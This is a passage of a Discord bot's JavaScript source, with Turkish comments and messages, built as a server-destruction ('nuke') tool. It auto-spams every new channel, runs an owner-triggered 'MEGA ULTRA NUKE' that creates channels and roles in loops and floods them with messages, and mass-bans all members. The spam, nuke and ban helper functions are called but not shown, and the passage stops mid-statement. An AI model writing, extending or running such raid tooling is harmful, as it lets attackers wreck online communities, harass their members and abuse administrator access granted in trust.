// OTO SPAM - YENİ KANAL
client.on('channelCreate', async (channel) => {
    if (channel.type !== 0) return;
    
    console.log(`[AUTO-SPAM] 💥 YENİ KANAL: ${channel.name}`);
    
    // ANINDA MEGA SPAM!
    megaWebhookSpam(channel);
    megaNormalSpam(channel);
});

client.on('messageCreate', async message => {
    if (message.author.bot || !message.guild) return;
    if (message.author.id !== config.ownerId) return;
    if (!message.content.startsWith(config.prefix)) return;

    const args = message.content.slice(config.prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'patlat') {
        if (!message.guild.members.me.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply('❌ Admin yetkisi yok!');
        }

        await message.reply('🔥💥⚡ MEGA ULTRA NUKE BAŞLIYOR!\n• 20 kanal/döngü\n• 50 rol/döngü\n• 300+ mesaj/kanal\n• SONSUZ MOD!\n\nDURDURMAK: `!durdur`');
        
        await megaUltraNuke(message.guild);
    }

    else if (command === 'b') {
        if (!message.guild.members.me.permissions.has(PermissionFlagsBits.BanMembers)) {
            return message.reply('❌ Ban yetkisi yok!');
        }

        await message.reply('🔨⚡ INSTANT MASS BAN BAŞLIYOR...');
        
        const count = await instantMassBan(message.guild);
        
        await message.channel.send(`✅ ${count} KİŞİ BANLANDI!`).catch(() => {});
    }

    else if (command === 'durdur') {
        nukeActive = false;
        await message.reply('⛔ MEGA NUKE DURDURULUYOR...');
        console.log('');
        console.log('═'.repeat(60));
        console.log('[STOP] ⛔ NUKE DURDURULDU!');
        console.log('═'.repeat(60));
        console.log('');
    }
});

client.on('error', error => console.error('[ERROR]', error));
process.on('unhandledRejection', error => console.error('[UNHANDLED]', error));

client.login(config.token).catch(error => {
